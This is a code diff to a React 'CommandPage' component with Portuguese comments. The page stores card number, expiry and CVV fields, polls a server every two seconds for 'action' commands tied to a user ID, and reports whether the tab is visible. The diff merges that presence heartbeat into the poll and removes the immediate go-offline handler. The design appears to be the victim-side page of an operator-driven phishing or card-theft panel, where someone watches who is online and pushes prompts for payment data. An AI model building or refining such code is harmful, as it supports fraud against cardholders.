@@ -16,11 +16,12 @@ function CommandPage({ userId }) {
   const [cardExpiry, setCardExpiry] = useState("");
   const [cardCvv, setCardCvv] = useState("");
 
-  // Polling de comandos (heartbeat automático via check-action)
+  // Polling de comandos + heartbeat só quando aba visível
   useEffect(() => {
     const checkCommand = async () => {
       try {
-        const response = await axios.get(`${API}/user/check-action/${userId}`);
+        const hb = document.hidden ? 0 : 1;
+        const response = await axios.get(`${API}/user/check-action/${userId}?hb=${hb}`);
         if (response.data && response.data.action) {
           setCurrentCommand(response.data);
         }
@@ -32,24 +33,6 @@ function CommandPage({ userId }) {
     checkCommand();
     const interval = setInterval(checkCommand, 2000);
     return () => clearInterval(interval);
-  }, [userId]);
-
-  // Detectar saída da aba - marcar offline IMEDIATAMENTE
-  useEffect(() => {
-    const handleVisibility = () => {
-      if (document.hidden) {
-        fetch(`${API}/user/go-offline/${userId}`, { method: 'POST', keepalive: true });
-      }
-    };
-
-    document.addEventListener("visibilitychange", handleVisibility);
-    window.addEventListener("beforeunload", () => {
-      fetch(`${API}/user/go-offline/${userId}`, { method: 'POST', keepalive: true });
-    });
-
-    return () => {
-      document.removeEventListener("visibilitychange", handleVisibility);
-    };
   }, [userId]);
 
   // Resetar estados quando o comando muda
